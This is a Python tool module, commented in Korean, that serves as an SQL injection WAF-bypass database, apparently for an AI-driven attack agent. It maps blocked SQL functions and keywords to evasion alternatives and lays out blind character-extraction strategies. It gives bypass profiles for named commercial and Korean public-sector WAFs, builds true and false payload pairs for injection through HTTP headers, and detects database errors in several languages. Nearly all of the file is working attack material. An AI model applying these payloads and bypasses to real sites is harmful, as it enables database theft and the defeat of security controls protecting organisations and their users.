"""
bingo/tools/waf_sqli_payloads.py — WAF SQLi 우회 지식 데이터베이스 (v1.1.0)

WAF가 특정 SQL 함수/키워드를 차단할 때 대안을 즉시 제공.
AI가 매번 처음부터 우회 방법을 발명할 필요 없이 검증된 페이로드를 참조.

v1.1.0: 글로벌 WAF 프로파일 추가 (Akamai/Imperva/F5/Barracuda/ModSecurity)
        응답 언어 자동 감지 에러 키워드 다국어 확장

Tool: waf_sqli_db
"""
from __future__ import annotations
from typing import Optional

# ════════════════════════════════════════════════════════════════
# SQLi 함수 우회 매핑 — 차단된 함수 → 대안 목록 (검증 순)
# ════════════════════════════════════════════════════════════════
FUNCTION_ALTERNATIVES: dict[str, list[str]] = {

    # ── 문자열 추출 (단일 문자) ─────────────────────────────────
    "SUBSTR": [
        "MID({str},{pos},1)",
        "RIGHT(LEFT({str},{pos}),1)",
        "RIGHT(REVERSE(LEFT(REVERSE({str}),{rpos})),1)",  # rpos = len - pos + 1
        "LPAD(RPAD({str},{pos},0x20),1,0x20)",
        "TRIM(LEADING SUBSTR({str},1,{pos1}) FROM LEFT({str},{pos}))",
        "INSERT({str},1,{pos1},0x20)",  # pos1 = pos-1
        "CONVERT(SUBSTR({str},{pos},1) USING utf8)",
        "ELT(1,SUBSTR({str},{pos},1))",
        "IF(1=1,SUBSTR({str},{pos},1),0)",
    ],
    "MID": [
        "SUBSTR({str},{pos},1)",
        "RIGHT(LEFT({str},{pos}),1)",
        "SUBSTRING({str},{pos},1)",
    ],
    "LEFT": [
        "RIGHT(REVERSE({str}),LENGTH({str})-{n}+1)",   # LEFT(str, n) 대안
        "SUBSTR({str},1,{n})",
        "MID({str},1,{n})",
        "TRIM(TRAILING SUBSTR({str},{n1},99) FROM {str})",  # n1=n+1
    ],
    "RIGHT": [
        "SUBSTR({str},LENGTH({str})-{n}+1)",
        "MID({str},-{n})",
    ],

    # ── ASCII/문자 변환 ─────────────────────────────────────────
    "ASCII": [
        "ORD({char})",
        "CONV(HEX({char}),16,10)",
        "WEIGHT_STRING({char} AS CHAR(1) LEVEL 1)",
        "FIND_IN_SET({char},CHAR(48,49,50,51,52,53,54,55,56,57))",  # 0-9 탐색
        "STRCMP({char},CHAR({n}))",  # 이진탐색용
    ],
    "ORD": [
        "ASCII({char})",
        "CONV(HEX({char}),16,10)",
        "WEIGHT_STRING({char} AS CHAR(1) LEVEL 1)",
    ],

    # ── 데이터베이스/서버 정보 ──────────────────────────────────
    "DATABASE()": [
        "DATABASE/**/()",
        "SCHEMA()",
        "@@datadir",          # DB 경로로 DB 이름 유추 가능
        "(SELECT schema_name FROM information_schema.schemata LIMIT 1)",
        "VERSION()",          # DB 버전 (DB 이름이 목적이면 아래 사용)
        "IFNULL(DATABASE(),0x7e)",
        "IF(1=1,DATABASE/***/(),0)",
    ],
    "VERSION()": [
        "VERSION/**/()",
        "@@VERSION",
        "@@version_comment",
    ],
    "USER()": [
        "USER/**/()",
        "CURRENT_USER()",
        "CURRENT_USER",
        "@@global.hostname",
        "SESSION_USER()",
        "SYSTEM_USER()",
    ],

    # ── 공백 우회 ───────────────────────────────────────────────
    " ": [
        "/**/",
        "/*!*/",
        "%09",    # 탭
        "%0a",    # 개행
        "%0d",    # CR
        "%0b",    # 수직탭
        "%0c",    # 폼피드
        "+",      # URL 인코딩 공백
        "/*comment*/",
    ],

    # ── 비교 연산자 우회 ────────────────────────────────────────
    "=": [
        "LIKE",
        "REGEXP",
        "RLIKE",
        "BETWEEN {v} AND {v}",
        "IN({v})",
        "NOT!=",           # !!= → !=의 역 (일부 파서)
    ],
    ">": [
        "GREATEST({a},{b})={a}",
        "NOT BETWEEN 0 AND {b}",
        "!<",
    ],
    "<": [
        "LEAST({a},{b})={a}",
        "BETWEEN 0 AND {b}",
        "!>",
    ],

    # ── INFORMATION_SCHEMA 우회 ────────────────────────────────
    "INFORMATION_SCHEMA": [
        "information_schema",
        "INFORMATION_SCHEMA/**/.tables",
        "mysql.innodb_table_stats",      # MySQL 5.6+
        "sys.schema_tables",              # sys schema
        "performance_schema.tables",
    ],

    # ── SLEEP/시간 기반 ─────────────────────────────────────────
    "SLEEP": [
        "SLEEP/***/({n})",           # 공백 주석
        "SLEEP/***/({n},1)",         # MySQL 2-arg
        "/*!SLEEP*/({n})",           # 버전 인라인 주석
        "SLEEP%09({n})",             # 탭 공백
        "BENCHMARK(50000000,MD5(1))",
        "GET_LOCK(0x61,{n})",        # GET_LOCK('a', n)
        "WAIT_FOR_EXECUTED_GTID_SET('a',{n})",
        # PostgreSQL 대체
        "pg_sleep({n})",
        "(SELECT pg_sleep({n}))",
        # MSSQL 대체
        "WAITFOR DELAY '0:0:{n}'",
        # SQLite 대체
        "(SELECT count(*) FROM sqlite_master t1,sqlite_master t2,sqlite_master t3)",
    ],

    # ── SELECT 키워드 ───────────────────────────────────────────
    "SELECT": [
        "SELECT/**/",
        "SE/**/LECT",
        "%53ELECT",    # S URL 인코딩
        "/*!50000SELECT*/",
    ],

    # ── UNION 우회 ──────────────────────────────────────────────
    "UNION": [
        "UNION/**/",
        "UNION%0a",
        "UNION%09",
        "UN/**/ION",
        "/*!50000UNION*/",
    ],

    # ── AND/OR 우회 ─────────────────────────────────────────────
    "AND": [
        "&&",
        "AND/**/",
        "%26%26",           # URL 인코딩 &&
        "AND%0a",
        "/*!AND*/",
        # v1.2.0 추가 — 고급 우회
        "/*!12345AND*/",    # 버전 인라인 주석
        "AnD",              # 대소문자 혼합
        "AND%09",           # 탭 공백
        "%09AND%09",        # 탭 양쪽
        "%00AND%00",        # NULL 바이트
        "AND%0d%0a",        # CRLF
        "XOR/**/0/**/OR",   # MySQL XOR 우회 (1 XOR 0 = 1)
        "%2526%2526",       # 이중 URL 인코딩 &&
    ],
    "OR": [
        "||",
        "OR/**/",
        "%7c%7c",
        "OR%0a",
        # v1.2.0 추가
        "/*!12345OR*/",
        "Or",
        "OR%09",
        "%09OR%09",
        "%00OR%00",
        "OR%0d%0a",
        "%257c%257c",       # 이중 URL 인코딩 ||
    ],
}

# ════════════════════════════════════════════════════════════════
# 문자 추출 전용 — RIGHT 만 사용 가능한 경우 전략
# (기록.md 현재 상황: SUBSTR/MID/ASCII/LEFT/ORD 차단, RIGHT 통과)
# ════════════════════════════════════════════════════════════════
RIGHT_ONLY_STRATEGY = """
=== RIGHT만 사용 가능한 문자 추출 전략 ===

목표: 문자열 str에서 N번째 문자 추출

1) LIKE 패턴 비교 (가장 간단):
   str LIKE 'k%'   → 첫 글자가 k?
   str LIKE 'ka%'  → 첫 두 글자가 ka?

2) RIGHT + REVERSE (단일 문자 추출):
   RIGHT(str, 1)         = 마지막 문자
   RIGHT(REVERSE(str), 1) = 첫 번째 문자  ← REVERSE도 안 막히면 사용
   RIGHT(str, LENGTH(str)-N+1) = N번째 이후 문자들

3) BETWEEN 이진탐색 (ASCII 없이 범위 좁히기):
   str BETWEEN 'a' AND 'm'  → 알파벳 앞 절반?
   str BETWEEN 'n' AND 'z'  → 알파벳 뒤 절반?

4) REGEXP 패턴:
   str REGEXP '^k'          → 첫 글자가 k?
   str REGEXP '^ka'         → 처음 두 글자가 ka?

5) FIND_IN_SET (집합 탐색):
   FIND_IN_SET(LEFT(str,1), 'k,a,c,p,r') > 0  → 첫 글자가 집합 내?
   (LEFT가 차단된 경우 SUBSTR 대신)

추출 루프 Python 예시 (REGEXP 사용):
  charset = string.ascii_lowercase + string.digits + '_'
  result = ''
  for pos in range(1, max_len+1):
      for c in charset:
          # REGEXP '^' + result + c
          payload = f"REGEXP 0x{('^' + result + c).encode().hex()}"
          ...
"""

# ════════════════════════════════════════════════════════════════
# 인터페이스 함수
# ════════════════════════════════════════════════════════════════

def get_alternatives(blocked_func: str, context: Optional[str] = None) -> dict:
    """차단된 SQL 함수/키워드의 대안 목록 반환.

    Parameters
    ----------
    blocked_func : 차단된 SQL 함수명 (예: "SUBSTR", "ASCII", "DATABASE()")
    context      : 추가 컨텍스트 (예: "only_RIGHT_available")

    Returns
    -------
    dict: {"alternatives": [...], "strategy": str}
    """
    key = blocked_func.upper().strip("()")
    # 완전 매칭 시도
    alts = FUNCTION_ALTERNATIVES.get(key, [])
    if not alts:
        # 부분 매칭
        for k, v in FUNCTION_ALTERNATIVES.items():
            if key in k or k in key:
                alts = v
                break

    strategy = ""
    if context and "right" in context.lower():
        strategy = RIGHT_ONLY_STRATEGY

    return {
        "blocked": blocked_func,
        "alternatives": alts,
        "strategy": strategy,
        "count": len(alts),
    }


# ════════════════════════════════════════════════════════════════
# 글로벌 WAF 프로파일 (v1.1.0)
# 각 WAF 벤더별 검증된 우회 tamper 전략
# ════════════════════════════════════════════════════════════════
GLOBAL_WAF_PROFILES: dict[str, dict] = {

    # ── Cloudflare ────────────────────────────────────────────────
    "cloudflare": {
        "vendor": "Cloudflare",
        "detection": ["__cfduid", "cf-ray", "cloudflare", "cf-cache-status"],
        "bypass_strategy": [
            "space2comment: 공백 → /**/ 치환",
            "randomcase: SELECT → SeLeCt",
            "versionedmorekeywords: /*!50000SELECT*/",
            "charencode: URL 인코딩 이중 적용",
            "Header: X-Forwarded-For: 127.0.0.1",
            "Chunked Transfer-Encoding 분할 전송",
        ],
        "tampers": ["space2comment", "randomcase", "versionedmorekeywords", "charencode"],
        "notes": "JS Challenge → Cloudflare 봇 감지 → User-Agent 변경 + Referer 추가",
    },

    # ── Akamai ────────────────────────────────────────────────────
    "akamai": {
        "vendor": "Akamai Kona Site Defender / App & API Protector",
        "detection": ["akamai", "ak_bmsc", "x-akamai", "akamaierror"],
        "bypass_strategy": [
            "HTTP/2 요청 사용 (requests-h2 or curl --http2)",
            "공백 → %09 (탭) 또는 %0a (LF) 치환",
            "UNION → UN/**/ION 분할",
            "SELECT → /*!SELECT*/ 인라인 주석",
            "소문자 + 랜덤 케이스 혼합: uNiOn SeLeCt",
            "Referer: https://www.google.com/ 헤더 추가",
            "User-Agent: Mozilla/5.0 (Googlebot) 사용",
            "JSON 바디로 파라미터 전달 (application/json)",
        ],
        "tampers": ["space2morehash", "randomcase", "between", "equaltolike"],
        "notes": "Akamai는 요청 속도도 감시 — 요청 간격 0.5~2s 랜덤 딜레이 필수",
    },

    # ── Imperva (Incapsula) ───────────────────────────────────────
    "imperva": {
        "vendor": "Imperva Incapsula / Cloud WAF",
        "detection": ["incap_ses", "visid_incap", "x-iinfo", "incapsula"],
        "bypass_strategy": [
            "HTTP Parameter Pollution: ?id=1&id=payload",
            "Multipart/form-data로 파라미터 전달",
            "공백 → %20%20 이중 인코딩",
            "주석 내 키워드: sel/*ect*/",
            "CHAR() 함수로 문자열 우회: CHAR(115,101,108,101,99,116)",
            "null byte: %00 삽입 (일부 버전)",
            "Base64 인코딩 파라미터 (앱이 디코드하는 경우)",
        ],
        "tampers": ["space2comment", "charencode", "chardoubleencode", "space2plus"],
        "notes": "세션 쿠키(incap_ses) 유지 필수 — 세션 없으면 모든 요청 차단",
    },

    # ── F5 BIG-IP ASM ─────────────────────────────────────────────
    "f5": {
        "vendor": "F5 BIG-IP Application Security Manager",
        "detection": ["ts", "f5-bigip", "bigipserver", "TS01"],
        "bypass_strategy": [
            "HPP (HTTP Parameter Pollution) 매우 효과적",
            "청크 인코딩: Transfer-Encoding: chunked",
            "SQL 주석 변형: /*!32302 union*/ /*!32302 select*/",
            "공백 → %0a%0d (CRLF) 치환",
            "HTML 엔티티 인코딩: &#115;elect",
            "Unicode 우회: ЅELECT (키릴 S)",
            "JSON Path 인젝션 (JSON 파라미터)",
        ],
        "tampers": ["space2comment", "charunicodeencode", "randomcase", "between"],
        "notes": "F5는 시그니처 기반 — 알려진 패턴 변형으로 우회 가능성 높음",
    },

    # ── Barracuda WAF ─────────────────────────────────────────────
    "barracuda": {
        "vendor": "Barracuda Web Application Firewall",
        "detection": ["barracuda", "barra_counter_session"],
        "bypass_strategy": [
            "URL 이중 인코딩: %2527 (% → %25)",
            "공백 → /**_**/  (언더스코어 포함 주석)",
            "SELECT → SE+LECT (+ 기호)",
            "관계 연산자 우회: BETWEEN + IN()",
            "concat 대신 CONCAT_WS 사용",
            "CASE WHEN 구문으로 조건 우회",
        ],
        "tampers": ["chardoubleencode", "space2comment", "between", "concat2concatws"],
        "notes": "Barracuda는 상대적으로 우회 쉬운 편 — 기본 인코딩 변형으로 통과 가능",
    },

    # ── ModSecurity (오픈소스 WAF) ───────────────────────────────
    "modsecurity": {
        "vendor": "ModSecurity / OWASP CRS",
        "detection": ["mod_security", "NOYB", "406 Not Acceptable"],
        "bypass_strategy": [
            "CRS Paranoia Level 1(기본) → 주석 우회 매우 효과적",
            "/*!<버전>UNION*/ 인라인 주석 버전",
            "공백 → %09/%0b/%0c 탭/VT/FF 문자",
            "OR → || 파이프 우회",
            "AND → && 앰퍼샌드 우회",
            "비교 → LIKE 또는 REGEXP 우회",
            "Union → uNiOn 케이스 변환",
        ],
        "tampers": ["space2morehash", "versionedmorekeywords", "halfversionedmorekeywords"],
        "notes": "CRS 버전 확인 필요 — v3.x 이상은 paranoia level 높으면 우회 어려움",
    },

    # ── AWS WAF ───────────────────────────────────────────────────
    "aws_waf": {
        "vendor": "AWS WAF / Shield",
        "detection": ["x-amzn-requestid", "x-amz-cf-id", "awsalb"],
        "bypass_strategy": [
            "JSON 바디로 SQLi 전달: {\"id\": \"1 OR 1=1\"}",
            "GraphQL 쿼리로 우회 (JSON 파서 경유)",
            "공백 → %0a 개행 치환",
            "URL 인코딩 → 이중 인코딩",
            "헤더 인젝션: X-Custom-Header에 페이로드",
            "HTTP/2 프로토콜 사용",
        ],
        "tampers": ["space2comment", "charencode", "randomcase"],
        "notes": "AWS WAF 매니지드 룰셋 — IP 기반 속도제한 있음 (초당 2000 req)",
    },

    # ── Wapples (한국) ────────────────────────────────────────────
    "wapples": {
        "vendor": "Wapples (PIOLINK, KR)",
        "detection": ["wapples", "PIOLINK"],
        "bypass_strategy": [
            "korean_waf_bypass tamper",
            "space2comment + versionedmorekeywords",
            "한국어 에러 메시지 확인: '비정상적인 접근'",
        ],
        "tampers": ["space2comment", "versionedmorekeywords", "randomcase"],
        "notes": "한국 금융/공공기관 多 사용",
    },

    # ── KISA WAF (한국인터넷진흥원 / 공공기관 전용) ──────────────
    "kisa": {
        "vendor": "KISA / 공공기관 전용 WAF (Korea Internet & Security Agency)",
        "detection": ["KISA", "kisa", "비정상적인 접근", "보안 정책", "차단 페이지"],
        "bypass_strategy": [
            "/*!12345AND*/ 버전 인라인 주석 — AND/OR 키워드 직접 우회",
            "%09(탭)을 공백 대신 사용: ?id=1%09AND%091=1",
            "CASE WHEN 조건문: CASE WHEN 1=1 THEN 1 ELSE 0 END (AND 없음)",
            "HTTP 헤더 인젝션: X-Forwarded-For, Referer, User-Agent에 페이로드",
            "파라미터 오염(HPP): ?id=1&id=payload — 일부 파서가 뒤쪽 값 처리",
            "소문자 혼합: AnD, Or",
            "NULL 바이트 삽입: %00AND%001=1",
            "LIKE/REGEXP 조건으로 AND/OR 대체",
        ],
        "tampers": ["space2tab", "versionedmorekeywords", "randomcase", "nullbyte"],
        "notes": "공공기관 표준 WAF — 400 응답으로 SQL 키워드 차단. 헤더 인젝션이 가장 효과적",
    },

    # ── HPP / JSON / Multipart / HTTP2 / Chunked 프로토콜 우회 ──
    "protocol_bypass": {
        "vendor": "Protocol-Level WAF Bypass (범용)",
        "detection": [],  # 명시적 감지 없음 — Boolean/헤더 모두 실패 시 자동 시도
        "bypass_strategy": [
            "HPP (HTTP Parameter Pollution): ?id=1&id=payload — 일부 WAF는 첫 번째 값만 검사",
            "JSON body POST: Content-Type: application/json + {\"id\":\"payload\"} — WAF JSON 파서 미구현 시",
            "Multipart/form-data: -F 'id=payload' — form boundary로 시그니처 분산",
            "HTTP/2: --http2 — WAF가 HTTP/1.1만 분석하는 경우",
            "Chunked Transfer-Encoding: Transfer-Encoding: chunked — 페이로드 분할로 시그니처 분산",
        ],
        "tampers": [],
        "notes": "Boolean 우회 12종 + 헤더 인젝션 5종 모두 실패 후 자동 시도 (sqli_boolean STAGE 4)",
    },

    # ── Generic 400-block WAF (AND/OR→400 패턴) ──────────────────
    "generic_400": {
        "vendor": "Unknown WAF (AND/OR → 400 Block Pattern)",
        "detection": ["400 bad request", "blocked", "웹 방화벽", "접근이 차단"],
        "bypass_strategy": [
            "STEP 1: /*!12345AND*/ 버전 인라인 주석 시도",
            "STEP 2: %09(탭) 공백 치환: %09AND%09",
            "STEP 3: CASE WHEN 1=1 THEN 1 ELSE 0 END",
            "STEP 4: HTTP 헤더 인젝션 — User-Agent/Referer에 페이로드",
            "STEP 5: X-Forwarded-For: 127.0.0.1 추가 + 페이로드",
            "STEP 6: POST 바디로 전환 (GET 파라미터 대신)",
            "STEP 7: 청크 분할 전송 (Transfer-Encoding: chunked)",
        ],
        "tampers": ["versionedmorekeywords", "space2tab", "nullbyte", "randomcase"],
        "notes": "단따옴표로 크기 변화 있으면 injection point는 존재 — WAF만 돌파하면 됨",
    },
}


# ════════════════════════════════════════════════════════════════
# HTTP 헤더 인젝션 — URL 파라미터 WAF 우회 완전 실패 시 최후 수단
# ════════════════════════════════════════════════════════════════
HTTP_HEADER_INJECTION_TEMPLATES: list[dict] = [
    {
        "header": "X-Forwarded-For",
        "template": "127.0.0.1' {condition} --",
        "desc": "X-Forwarded-For IP 필드에 페이로드 삽입",
        "notes": "일부 백엔드가 이 헤더를 WHERE 조건에 포함 (IP 로깅 기능)",
    },
    {
        "header": "User-Agent",
        "template": "Mozilla/5.0' {condition} -- -",
        "desc": "User-Agent에 페이로드 삽입",
        "notes": "방문자 로그/통계 테이블에 User-Agent 저장하는 경우",
    },
    {
        "header": "Referer",
        "template": "https://www.google.com/search?q=1' {condition} -- -",
        "desc": "Referer 헤더에 페이로드 삽입",
        "notes": "유입 경로 추적 기능 있는 사이트에서 효과적",
    },
    {
        "header": "X-Real-IP",
        "template": "192.168.1.1' {condition} --",
        "desc": "X-Real-IP 헤더 인젝션",
        "notes": "X-Forwarded-For 보완 헤더",
    },
    {
        "header": "Accept-Language",
        "template": "ko-KR,ko' {condition} --",
        "desc": "Accept-Language 헤더 인젝션",
        "notes": "다국어 처리 로직에서 헤더값을 쿼리에 포함하는 경우",
    },
]


def get_header_injection_payloads(condition_true: str, condition_false: str) -> list[dict]:
    """HTTP 헤더 인젝션 페이로드 쌍 생성.

    Parameters
    ----------
    condition_true  : TRUE 조건 (예: "AND 1=1")
    condition_false : FALSE 조건 (예: "AND 1=2")

    Returns
    -------
    list of dict: [{"header": ..., "true_payload": ..., "false_payload": ...}, ...]
    """
    result = []
    for tmpl in HTTP_HEADER_INJECTION_TEMPLATES:
        result.append({
            "header": tmpl["header"],
            "true_payload":  tmpl["template"].replace("{condition}", condition_true),
            "false_payload": tmpl["template"].replace("{condition}", condition_false),
            "desc": tmpl["desc"],
            "notes": tmpl["notes"],
        })
    return result

# ════════════════════════════════════════════════════════════════
# 다국어 에러 메시지 — SQL 에러 감지용 (v1.1.0)
# 한국어 편향 → 글로벌 다국어 확장
# ════════════════════════════════════════════════════════════════
SQL_ERROR_PATTERNS: dict[str, list[str]] = {
    # ── DB 엔진 공통 (언어 무관) ──────────────────────────────────
    "universal": [
        "you have an error in your sql syntax",
        "sql syntax.*mysql",
        "warning.*mysql",
        "unclosed quotation mark",
        "quoted string not properly terminated",
        "ora-[0-9]{5}",           # Oracle
        "microsoft.*odbc.*sql",
        "jdbc.*exception",
        "pg.*error",              # PostgreSQL
        "sqlite.*error",
        "near.*syntax error",
        "syntax error.*unexpected",
        "1064.*you have an error",
        "1054.*unknown column",
        "1146.*table.*doesn.*exist",
        "data type mismatch",
    ],

    # ── 영어 (글로벌) ─────────────────────────────────────────────
    "en": [
        "sql error", "database error", "query failed",
        "invalid query", "mysql fetch", "db error",
        "syntax error", "invalid sql", "bad sql grammar",
        "supplied argument is not a valid mysql",
        "access violation", "division by zero",
        "connection failed", "unexpected token",
        "conversion failed", "invalid column name",
    ],

    # ── 한국어 ───────────────────────────────────────────────────
    "ko": [
        "sql 오류", "데이터베이스 오류", "쿼리 오류",
        "잘못된 sql", "쿼리 실패", "db 오류",
        # 아래는 진짜 에러가 아닌 앱 메시지 (오탐 방지 — SQLi 판단 제외)
        # "잘못된 접근", "존재하지 않는", "정상적인 접근이 아닙니다"
    ],

    # ── 중국어 (简体/繁体) ────────────────────────────────────────
    "zh": [
        "sql错误", "数据库错误", "查询失败", "语法错误",
        "无效的查询", "数据库连接失败", "mysql错误",
        "sql語法錯誤", "資料庫錯誤",   # 繁体
        "系统错误", "系统异常",
    ],

    # ── 일본어 ───────────────────────────────────────────────────
    "ja": [
        "sqlエラー", "データベースエラー", "クエリエラー",
        "構文エラー", "sql構文", "データベース接続エラー",
        "mysqlエラー", "不正なsql",
    ],

    # ── 러시아어 ─────────────────────────────────────────────────
    "ru": [
        "ошибка sql", "ошибка базы данных", "синтаксическая ошибка",
        "неверный запрос", "ошибка mysql",
    ],

    # ── 스페인어/포르투갈어 ───────────────────────────────────────
    "es": [
        "error sql", "error de base de datos", "error de sintaxis",
        "consulta inválida", "erro sql", "erro de banco de dados",
    ],

    # ── 아랍어 ───────────────────────────────────────────────────
    "ar": [
        "خطأ sql", "خطأ في قاعدة البيانات", "خطأ في الاستعلام",
    ],

    # ── HTTP 에러 메시지 (언어 무관) ──────────────────────────────
    "http": [
        "500 internal server error",
        "500 - internal server error",
        "server error in",
        "application error",
        "runtime error",
        "fatal error",
        "unhandled exception",
        "stack trace",
        "at line [0-9]+",
    ],
}

# ── 오탐 제외 패턴 (진짜 에러가 아닌 앱 메시지) ────────────────
FALSE_POSITIVE_PATTERNS: dict[str, list[str]] = {
    "ko": [
        "잘못된 접근", "존재하지 않는", "정상적인 접근이 아닙니다",
        "접근 권한이 없습니다", "로그인 후 이용하세요",
        "페이지를 찾을 수 없습니다", "잘못된 요청",
    ],
    "en": [
        "page not found", "access denied", "forbidden",
        "not authorized", "login required", "invalid request",
        "bad request", "no permission",
    ],
    "zh": [
        "页面不存在", "访问被拒绝", "无权访问", "请先登录",
        "请求无效", "操作失败",
    ],
    "ja": [
        "ページが見つかりません", "アクセスが拒否されました",
        "ログインが必要です", "無効なリクエスト",
    ],
}


def detect_waf_from_response(headers: dict, body: str) -> Optional[str]:
    """응답 헤더/바디에서 WAF 종류 자동 감지.

    Parameters
    ----------
    headers : HTTP 응답 헤더 dict
    body    : HTTP 응답 바디 문자열

    Returns
    -------
    WAF 이름 (소문자) 또는 None
    """
    combined = " ".join(f"{k}:{v}" for k, v in headers.items()).lower() + " " + body.lower()

    for waf_name, profile in GLOBAL_WAF_PROFILES.items():
        for sig in profile["detection"]:
            if sig.lower() in combined:
                return waf_name

    return None


def get_waf_bypass_strategy(waf_name: str) -> dict:
    """WAF 이름으로 우회 전략 반환.

    Parameters
    ----------
    waf_name : WAF 이름 (예: "cloudflare", "akamai")

    Returns
    -------
    dict: {"vendor": str, "bypass_strategy": [...], "tampers": [...], "notes": str}
    """
    key = waf_name.lower().strip()
    profile = GLOBAL_WAF_PROFILES.get(key)
    if not profile:
        # 부분 매칭
        for k, v in GLOBAL_WAF_PROFILES.items():
            if key in k or k in key:
                return v
        return {
            "vendor": "Unknown WAF",
            "bypass_strategy": [
                "space2comment: 공백 → /**/",
                "randomcase: SELECT → SeLeCt",
                "versionedmorekeywords: /*!50000SELECT*/",
                "charencode: URL 인코딩",
                "LIKE 대신 = 사용",
            ],
            "tampers": ["space2comment", "randomcase", "charencode"],
            "notes": "WAF 미감지 — 범용 우회 전략 적용",
        }
    return profile


def is_sql_error(body: str, lang: str = "auto") -> bool:
    """응답 바디가 SQL 에러를 포함하는지 다국어로 감지.

    Parameters
    ----------
    body : HTTP 응답 바디
    lang : 언어 힌트 (auto=전체 검색)

    Returns
    -------
    bool
    """
    import re
    lower = body.lower()

    patterns_to_check = []
    if lang == "auto":
        for v in SQL_ERROR_PATTERNS.values():
            patterns_to_check.extend(v)
    else:
        patterns_to_check = SQL_ERROR_PATTERNS.get(lang, []) + SQL_ERROR_PATTERNS["universal"]

    for pat in patterns_to_check:
        if re.search(pat, lower):
            # 오탐 제외 확인
            for fp_list in FALSE_POSITIVE_PATTERNS.values():
                for fp in fp_list:
                    if fp.lower() in lower:
                        return False  # 오탐 패턴 → 에러 아님
            return True

    return False


def query_waf_db(blocked_functions: list[str]) -> dict:
    """여러 차단 함수에 대해 일괄 대안 조회.

    Parameters
    ----------
    blocked_functions : 차단된 함수/키워드 목록

    Returns
    -------
    dict: {함수명: [대안1, 대안2, ...], ...} + RIGHT_ONLY_STRATEGY
    """
    result: dict = {}
    for f in blocked_functions:
        data = get_alternatives(f)
        result[f] = data["alternatives"]

    # RIGHT 만 사용 가능한지 감지
    only_right = (
        any("SUBSTR" in f.upper() or "MID" in f.upper() or "ASCII" in f.upper()
            for f in blocked_functions)
        and not any("RIGHT" in f.upper() for f in blocked_functions)
    )

    return {
        "alternatives": result,
        "right_only_strategy": RIGHT_ONLY_STRATEGY if only_right else "",
        "tip": (
            "가장 먼저 시도할 것: LIKE/REGEXP 패턴 비교 (ASCII 필요 없음)"
            if only_right else
            "CONV(HEX(char),16,10) 는 대부분 WAF를 통과함"
        ),
    }
